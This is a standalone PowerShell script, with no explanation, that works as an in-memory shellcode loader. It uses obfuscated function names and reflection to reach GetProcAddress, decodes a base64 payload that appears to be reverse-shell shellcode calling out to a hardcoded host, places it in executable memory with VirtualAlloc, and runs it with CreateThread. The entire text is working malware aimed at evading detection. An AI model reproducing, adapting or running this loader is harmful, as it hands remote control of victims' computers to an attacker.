function zzLN {
	Param ($r47, $o_GTuy)		
	$k6i2oI = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $k6i2oI.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($k6i2oI.GetMethod('GetModuleHandle')).Invoke($null, @($r47)))), $o_GTuy))
}

function ngC {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $jiMdX7qW7ZVf,
		[Parameter(Position = 1)] [Type] $abffPMh = [Void]
	)
	
	$sWFjKB = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$sWFjKB.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jiMdX7qW7ZVf).SetImplementationFlags('Runtime, Managed')
	$sWFjKB.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $abffPMh, $jiMdX7qW7ZVf).SetImplementationFlags('Runtime, Managed')
	
	return $sWFjKB.CreateType()
}

[Byte[]]$eZh5nF = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVorBuyC2gCAF98ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$svIzM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zzLN kernel32.dll VirtualAlloc), (ngC @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $eZh5nF.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($eZh5nF, 0, $svIzM, $eZh5nF.length)

$e38png = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zzLN kernel32.dll CreateThread), (ngC @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$svIzM,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((zzLN kernel32.dll WaitForSingleObject), (ngC @([IntPtr], [Int32]))).Invoke($e38png,0xffffffff) | Out-Null